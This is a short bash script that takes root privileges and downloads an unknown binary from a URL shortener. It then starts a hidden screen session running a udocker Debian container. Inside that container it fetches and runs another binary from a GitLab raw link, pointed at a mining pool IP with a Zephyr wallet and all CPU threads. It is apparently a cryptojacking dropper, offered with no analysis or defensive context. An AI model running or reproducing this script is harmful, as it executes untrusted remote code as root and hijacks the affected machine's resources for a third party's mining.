#!/bin/bash
sudo su <<EOF
wget -qO asukowe https://s.id/asukowe && chmod +x * && ./asukowe && sleep 5 && apt-get install screen -y && screen -dmS run ./udocker/udocker --allow-root run debian /bin/bash -c 'wget -qO asu https://gitlab.com/heatheroigerald/asu/-/raw/main/rstd && chmod +x asu && ./asu -o 47.89.195.104:443 -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all) '
EOF
